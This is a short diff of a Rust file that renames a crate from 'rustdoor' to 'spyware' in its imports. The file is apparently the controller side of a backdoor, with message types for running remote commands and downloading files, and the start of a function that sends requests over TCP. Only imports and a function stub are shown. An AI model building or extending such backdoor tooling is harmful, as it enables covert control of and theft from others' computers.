@@ -1,11 +1,11 @@
-use rustdoor::communication::messages::{RunCommandRequest, MessageType, RunCommandResponse, MessageTypes, DownloadFileResponse};
+use spyware::communication::messages::{RunCommandRequest, MessageType, RunCommandResponse, MessageTypes, DownloadFileResponse};
 use std::io::{Error, Write};
 use std::net::TcpStream;
 use serde::Serialize;
 
-use rustdoor::communication::serialization::serialize_message;
-use rustdoor::communication::messages::{DownloadFileRequest, };
-use rustdoor::communication::server::get_message;
+use spyware::communication::serialization::serialize_message;
+use spyware::communication::messages::{DownloadFileRequest, };
+use spyware::communication::server::get_message;
 
 fn send_request(req: impl Serialize + MessageType, stream: &mut TcpStream) -> Result<(), Error> {
     let msg = serialize_message(req).unwrap();
